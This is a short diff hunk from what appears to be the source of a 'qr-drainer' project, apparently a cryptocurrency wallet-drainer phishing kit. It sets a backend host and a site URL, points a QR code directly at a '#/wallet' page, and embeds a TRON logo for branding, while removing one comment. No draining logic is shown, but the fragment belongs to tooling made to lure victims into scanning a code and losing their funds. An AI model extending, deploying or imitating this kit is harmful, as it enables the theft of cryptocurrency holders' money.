@@ -10,7 +10,6 @@ const BACKEND = "https://qr-drainer.onrender.com";
 const SITE_URL = "https://qr-drainer-one.vercel.app";
 
 // QR points DIRECTLY to the wallet page using a hash (Vercel never 404s hashes)
-// Level H error correction ensures it scans perfectly even with the logo in the middle
 const QR_VALUE = `${SITE_URL}/#/wallet`;
 
 const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";
